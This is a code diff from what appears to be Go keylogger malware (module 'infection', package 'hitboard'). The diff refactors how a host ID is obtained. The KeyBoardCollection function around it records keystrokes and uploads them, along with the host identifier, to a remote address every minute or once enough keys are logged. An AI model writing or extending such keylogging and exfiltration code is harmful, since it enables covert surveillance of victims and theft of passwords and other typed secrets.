@@ -3,7 +3,7 @@ package hitboard
 import (
 	"github.com/AllenDang/w32"
 	"github.com/parnurzeal/gorequest"
-	"infection/machineinfo"
+	"infection/util/lib"
 	"log"
 	"syscall"
 	"time"
@@ -38,7 +38,6 @@ func KeyBoardCollection(addr string) {
 		elapsedsec = int64(elapsed/time.Millisecond) / 1000
 		// 1mins 60s   hitting 180 times keyboard
 		keyboardStatusResponse := KeyboardStatusResponse{}
-		var versionDetail = machineinfo.GetSystemVersion()
 		if elapsedsec == 60 {
 			// remove null
 			if len(tmpKeylog) == 0 {
@@ -46,7 +45,7 @@ func KeyBoardCollection(addr string) {
 			}
 			msgstb := msg{
 				Record: tmpKeylog,
-				Hostid: versionDetail.Hostid,
+				Hostid: lib.HOSTID,
 			}
 			log.Println("upload msg", &msgstb)
 			resp, _, err := gorequest.New().
@@ -66,7 +65,7 @@ func KeyBoardCollection(addr string) {
 		} else if len(tmpKeylog) >= KeyCount {
 			msgstb := msg{
 				Record: tmpKeylog,
-				Hostid: versionDetail.Hostid,
+				Hostid: lib.HOSTID,
 			}
 			log.Println("upload msg", &msgstb)
 			resp, _, err := gorequest.New().
